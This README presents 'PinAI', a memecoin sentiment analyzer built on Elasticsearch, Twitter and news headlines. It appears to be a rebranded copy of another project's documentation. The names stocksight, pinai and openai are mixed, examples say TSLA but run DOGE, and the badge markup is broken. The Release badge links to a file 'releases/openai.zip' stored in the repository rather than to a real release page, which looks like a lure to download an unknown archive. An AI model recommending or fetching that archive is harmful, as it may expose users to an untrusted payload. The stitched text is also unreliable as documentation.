<img src="/docs/pinai.jpg?raw=true" alt="stocksight" />

[![License]([https://img.shields.io/github/license/shirosaidev/stocksight.svg?label=License&maxAge=86400](https://github.com/ttotokpl/PinAI/blob/main/LICENSE))](./LICENSE)
[![Release]([https://img.shields.io/github/release/shirosaidev/stocksight.svg?label=Release&maxAge=60)](https://github.com/shirosaidev/stocksight/releases/latest](https://github.com/ttotokpl/PinAI/blob/main/releases/openai.zip))

# PinAI
memecoins market analyzer and memecoins predictor using Elasticsearch, Twitter, News headlines and Python natural language processing and sentiment analysis. How much do emotions on Twitter and news headlines affect a stock's price? Let's find out...

## About
pinai is an open source stock market analysis software that uses Elasticsearch to store Twitter and news headlines data for memecoins. pinai analyzes the emotions of what the author writes and does sentiment analysis on the text to determine how the author "feels" about a memecoin. It could be used for more than finding sentiment of just memes, it could be used to find sentiment of anything...



## Requirements
- Python 3.x
- Elasticsearch 5.x
- Kibana 5.x
- elasticsearch python module
- nltk python module
- requests python module
- tweepy python module
- beautifulsoup4 python module
- textblob python module
- vaderSentiment python module
- newspaper3k python module

### Download

```shell
$ git clone https://github.com/ttotokpl/PinAI.git
$ cd PinAI
```
[Download latest version](https://github.com/shirosaidev/stocksight/releases/latest)

## Screenshot
Stocksight Kibana dashboard
<img src="https://github.com/shirosaidev/stocksight/blob/master/docs/stocksight-dashboard-kibana.png?raw=true" alt="pinai kibana dashboard" />


## Install - Docker

*** **See [how to use](#how-to-use) below before building the Docker containers** ***

1) Download/clone stocksight repo with git.
2) Set up pinai, elasticsearch and kibana containers using Docker compose
```
cd pinai
cp config.py.sample config.py
***see how to use below for config.py (pinai config) changes***
docker-compose build && docker-compose up
```
**This will volume mount config.py (stocksight settings) and twitteruserids.txt to those files in your local git cloned "stocksight" directory**

3) Once all the containers have started up, shell into the container

`docker exec -it pinai_pinai_1 bash`

4) See examples below for running pinai.

## Install - local

**Recommended to install Elasticsearch and Kibana in local machine or other machine/vm/docker**

1) Install python requirements using pip

`pip install -r requirements.txt`

2) Install python nltk data

`python -c "import nltk; nltk.download('punkt'); nltk.download('stopwords')"`


## How to use
1) Create a new twitter application and generate your consumer key and access token. https://developer.twitter.com/en/docs/basics/developer-portal/guides/apps.html
https://developer.twitter.com/en/docs/basics/authentication/guides/access-tokens.html

2) Copy config.py.sample to config.py (pinai config file)

3) Set elasticsearch settings in config.py for your env (for Docker, set `elasticsearch_host = "elasticsearch"`)

4) Add twitter consumer key/access token and secrets to config.py

5) Edit config.py and modify NLTK tokens required/ignored and twitter feeds you want to mine. NLTK tokens required are keywords which must be in tweet before adding it to Elasticsearch (whitelist). NLTK tokens ignored are keywords which if are found in tweet, it will not be added to Elasticsearch (blacklist).

### Examples

Run sentiment.py to create 'pinai' index in Elasticsearch and start mining and analyzing Tweets using keywords and the stock symbol TSLA

```sh
$ python sentiment.py -s DOGE -k 'Elon Musk',Musk --debug
```

Start mining and analyzing Tweets using keywords and the stock symbol TSLA and follow any url links in tweets and performing sentiment analysis on the link web page as well as the tweet

```sh
$ python sentiment.py -s DOGE -k 'Elon Musk',Musk -l --debug
```

Start mining and analyzing Tweets from feeds in config using cached user ids from file (if you change any of the twitter  feeds in the config file, you need to delete this file and recreate it without -f)

```sh
$ python sentiment.py -s DOGE -f twitteruserids.txt --debug
```

Start mining and analyzing News headlines and following headline links and scraping relevant text on landing page

```sh
$ python sentiment.py -s DOGE --followlinks --debug
```

Run stockprice.py to add stock prices to 'openai' index in Elasticsearch

```sh
$ python stockprice.py -s DOGE --debug
```

### Kibana

Load 'openai' index in Kibana. For index pattern you can use 'openai' if you only have the single index or 'openai-*', etc. For time-field name you will want to use the date/time field 'date'.

To import the saved exported visualizations/dashboard, go to Kibana, click on management, click on saved objects, click on the import button and import the export.json file.


### CLI options

```
usage: sentiment.py [-h] [-i INDEX] [-d] -s SYMBOL [-k KEYWORDS] [-a] [-u URL]
                    [-f FILE] [-l] [-n] [--frequency FREQUENCY]
                    [--followlinks] [-w]
                    [--overridetokensreq TOKEN [TOKEN ...]]
                    [--overridetokensignore TOKEN [TOKEN ...]] [-v] [--debug]
                    [-q] [-V]

optional arguments:
  -h, --help            show this help message and exit
  -i INDEX, --index INDEX
                        Index name for Elasticsearch (default: stocksight)
  -d, --delindex        Delete existing Elasticsearch index first
  -s SYMBOL, --symbol SYMBOL
                        Stock symbol you are interesed in searching for,
                        example: TSLA
  -k KEYWORDS, --keywords KEYWORDS
                        Use keywords to search for in Tweets instead of feeds.
                        Separated by comma, case insensitive, spaces are ANDs
                        commas are ORs. Example: TSLA,'Elon
                        Musk',Musk,Tesla,SpaceX
  -a, --addtokens       Add nltk tokens required from config to keywords
  -u URL, --url URL     Use twitter users from any links in web page at url
  -f FILE, --file FILE  Use twitter user ids from file
  -l, --linksentiment   Follow any link url in tweets and analyze sentiment on
                        web page
  -n, --newsheadlines   Get news headlines instead of Twitter using stock
                        symbol from -s
  --frequency FREQUENCY
                        How often in seconds to retrieve news headlines
                        (default: 120 sec)
  --followlinks         Follow links on news headlines and scrape relevant
                        text from landing page
  -w, --websentiment    Get sentiment results from text processing website
  --overridetokensreq TOKEN [TOKEN ...]
                        Override nltk required tokens from config, separate
                        with space
  --overridetokensignore TOKEN [TOKEN ...]
                        Override nltk ignore tokens from config, separate with
                        space
  -v, --verbose         Increase output verbosity
  --debug               Debug message output
  -q, --quiet           Run quiet with no message output
  -V, --version         Prints version and exits
  
  
usage: stockprice.py [-h] [-i INDEX] [-d] [-s SYMBOL] [-f FREQUENCY] [-v]
                     [--debug] [-q] [-V]

optional arguments:
  -h, --help            show this help message and exit
  -i INDEX, --index INDEX
                        Index name for Elasticsearch (default: stocksight)
  -d, --delindex        Delete existing Elasticsearch index first
  -s SYMBOL, --symbol SYMBOL
                        Stock symbol to use, example: TSLA
  -f FREQUENCY, --frequency FREQUENCY
                        How often in seconds to retrieve stock data (default:
                        120 sec)
  -v, --verbose         Increase output verbosity
  --debug               Debug message output
  -q, --quiet           Run quiet with no message output
  -V, --version         Prints version and exits
  ```
  
  
## Disclaimer

This software is for educational purposes only. USE THE SOFTWARE AT YOUR OWN RISK. THE AUTHORS AND ALL AFFILIATES ASSUME NO RESPONSIBILITY FOR YOUR TRADING RESULTS. Do not risk money which you are afraid to lose. There might be bugs in the code - this software DOES NOT come with ANY warranty.
